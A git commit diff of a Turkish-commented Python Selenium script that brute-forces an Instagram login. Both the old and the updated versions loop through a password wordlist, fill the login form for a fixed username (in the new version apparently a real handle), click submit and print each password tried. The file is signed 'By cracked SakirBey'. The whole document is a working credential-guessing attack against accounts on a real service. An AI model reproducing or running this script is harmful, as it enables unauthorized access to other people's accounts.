a258caa17ab96c3c606ec8a928661a70f38a64be
SakirBey1 <sakirhack81@gmail.com>
2021-11-24 22:14:52 +0300

    Update ınstragram.py

--- ınstragram.py
+++ ınstragram.py
@@ -1,29 +1,24 @@
 from selenium import webdriver
 import time
-
 browser = webdriver.Firefox()
-browser.get("https://www.instagram.com/accounts/login") # Instagram giriş sayfasına yönlendir.
 
-time.sleep(3) # Hata çıkmaması için buraya bir zamanlama koymamız gerek.
+browser.get('https://www.instagram.com/')
 
-username = browser.find_element_by_name("username") # Username divinin name değeri girilecek knk.
-password = browser.find_element_by_name("password") # Password divinin name değeri girilecek.
-giris    = browser.find_element_by_xpath('//*[@id="react-root"]/section/main/div/article/div/div[1]/div/form/div[4]') # Giriş yap butonunun xPath değeri alınacak.
+time.sleep(3)
 
-dosya = open("passwords.txt", "r") # Şifrelerin kaydedildiği wordlist dosyamızı açtık.
+user_name = browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[1]/div/label/input')
+password = browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[2]/div/label/input')
+giris = browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[3]/button')
+dosya = open('passwords.txt','r')
+time.sleep(3)
+for sifre in dosya:
+    user_name.send_keys('nyks_yig')
+    password.send_keys(sifre)
+    print(sifre)
+    giris.click()
+    time.sleep(2)
+    browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[1]/div/label/input').clear()
+    browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[2]/div/label/input').clear()
 
-for satir in dosya:
-    username.send_keys("instagram kullanıcı adı") # Instagram kullanıcı adı knk.
-    password.send_keys(satir) # WordList'teki şifreler. Tek tek denenecek.
-    giris.click() # Giriş yap butonuna tıklama komutu knk.
-    print("Denenen Şifre: [{}]".format(satir)) # Denenen şifreyi konsola yazdır.
-
-    time.sleep(3) # Şifreler denendikten sonra 3 saniye bekle.
-
-    username.clear() # Username değişkenini sıfırla.
-    password.clear() # Password değişkenini sıfırla.
-
-dosya.close() # WordList dosyamızı işlem bitince kapatalım.
-time.sleep(10) # 10 Saniye bekleyelim.
-browser.close() # WebDriveri sonlandıralım.
+dosya.close()
 # By cracked SakirBey 2021
